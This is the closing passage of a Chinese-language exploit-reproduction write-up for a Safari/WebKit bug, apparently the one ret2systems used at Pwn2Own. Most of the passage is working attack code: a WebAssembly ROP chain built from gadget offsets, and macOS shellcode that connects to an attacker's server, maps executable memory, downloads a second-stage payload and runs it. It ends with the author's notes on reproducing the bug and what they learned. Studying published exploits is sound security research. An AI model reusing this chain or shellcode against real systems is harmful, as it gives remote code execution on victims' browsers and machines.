          local.get 1
          i64.const 262144                                ;; 0x40000
          i64.sub
          drop
          drop
          local.get 0
          i64.const 624110                                ;; pop rsi
          i64.add
          drop
          drop
          drop
          local.get 0
          i64.const 3993325                                ;; pop rdx
          i64.add
          drop
          drop
          i64.const 48                                     ;; hndl_raw_mem_off+8
          i64.const 0
          i64.or
          drop
          drop
          local.get 0
          i64.const 16987498                               ;; syms['_memcpy']
          i64.add
          drop
          drop
          local.get 0
          i64.const 4627172                                ;; pop rdi
          i64.add
          drop
          drop
          local.get 1
          i64.const 176                                    ;; 22*8
          i64.add
          drop
          drop
          local.get 0
          i64.const 624110                                 ;; pop rsi
          i64.add
          drop
          drop
          local.get 1
          i64.const 262104                                 ;; 0x4000 - hndl_raw_mem_off
          i64.sub
          drop
          drop
          local.get 0
          i64.const 3993325                                ;; pop rdx
          i64.add
          drop
          drop
          i64.const 8
          i64.const 0
          i64.or
          drop
          drop
          local.get 0
          i64.const 16987498                               ;; syms['_memcpy']
          i64.add
          drop
          drop
          local.get 0
          i64.const 4627172                                ;; pop rdi
          i64.add
          drop
          drop
          drop
          local.get 0
          i64.const 624110                                 ;; pop rsi
          i64.add
          drop
          drop
          local.get 1
          i64.const 248                                    ;; 31*8
          i64.add
          drop
          drop
          local.get 0
          i64.const 3993325                                ;; pop rdx
          i64.add
          drop
          drop
          i64.const 144                                    ;; len(shellcode)
          i64.const 0
          i64.or
          drop
          drop
          local.get 0
          i64.const 16987498                               ;; syms['_memcpy']
          i64.add
          drop
          drop
          local.get 0
          i64.const 4627172                                ;; pop rdi, pass dlsym to shellcode
          i64.add
          drop
          drop
          local.get 0
          i64.const 16987090                               ;; syms['_dlsym']
          i64.add
          drop
          drop
          local.get 0
          i64.const 76691                                  ;; gadg['jmp_rax']
          i64.add
          drop                                             ;; begin to write shellcode
          i64.const 144115607791438153
          i64.or
          drop
          ......
### shellcode
            sc = '''
            ## save dlsym pointer
            mov r15, rdi
            ## socket(AF_INET, SOCK_STREAM, 0)
            mov eax, 0x2000061
            mov edi, 2
            mov esi, 1
            xor edx, edx
            syscall
            mov rbp, rax
            ## create addr struct
            mov eax, dword ptr [rip+ipaddr]
            mov r14, rax
            shl rax, 32
            or rax, 0x%x
            push rax
            mov eax, 0x2000062
            mov rdi, rbp
            mov rsi, rsp
            mov dl, 0x10
            syscall
            ## read sc size
            mov eax, 0x2000003
            mov dl, 8
            syscall
            ## mmap rwx
            xor edi, edi
            pop rsi
            mov dl, 7
            mov r10d, 0x1802 # MAP_PRIVATE|MAP_ANONYMOUS|MAP_JIT
            xor r8, r8
            dec r8
            xor r9, r9
            mov eax, 0x20000c5
            syscall
            ## read sc
            mov rdi, rbp
            mov rdx, rsi
            mov rsi, rax
            push rsi
            read_hdr:
            test rdx, rdx
            jz read_done
            mov eax, 0x2000003
            ## rdx gets trashed somehow in syscall???? no clue...
            push rdx
            syscall
            pop rdx
            sub rdx, rax
            add rsi, rax
            jmp read_hdr
            read_done:
            pop rsi
            ## jmp to sc, pass dlsym, socket, and server ip
            ## (need call not jmp to 16-byte align stack)
            mov rdi, r15
            xchg rsi, rbp
            mov rdx, r14
            call rbp
            ipaddr:
            '''%(2|(port<<16))
  * 由于safari沙箱机制, 仅仅这一个代码执行的漏洞还没有突破沙箱的限制, 所以目前单独复现该漏洞的效果就是能确认第一阶段shellcode运行成功, 向目标端口建立socket连接以获取第二阶段shellcode并返回调用
  * 关于第二阶段shellcode, 将会是沙箱逃逸的另一个漏洞, 只不过目前还没有公开的程序或资料, ret2systems也在博客末尾提到该漏洞将在之后的文章中分享
  * 作为漏洞复现的最终展示, 这里能看到
    * stage2_server可以成功建立连接
    * 使用lldb调试WebContent进程成功获取到shellcode中的int3断点并查看内存布局
## 总结
  * 这个漏洞本身还是非常好理解的, 从隐式类型转换到整数溢出再到栈溢出, 以及后面的ROP链的利用, 都还算是很经典的漏洞问题了
  * 本篇文章记录一下自己学习WebKit漏洞的过程, 尽管POC作者已经给出了相当详细的描述解释, 复现下来发现还是有一些坑要自己踩一下的. 在记录整理的过程中也发现很多原理上的细节没有注意到, 仔细思考后发现这些小细节都可以直接决定漏洞利用是否成功.
  * 在漏洞复现期间, 能明显的感觉到, 作者发现并编写了这一套漏洞利用, 我能做到复现, 仅仅是获得了作者在这方面十分之一的知识储备; 但从另一个角度讲, 如果没有做复现学习, 我们可能需要浪费十倍以上的时间在各种弯路上. 所以说还是要感谢分享技术的大佬, 让我们有机会快速进入这个领域, 并能够看见之后的方向.
  * 贴一张pwn2own截图, 愿大家都有这么一刻吧
* * *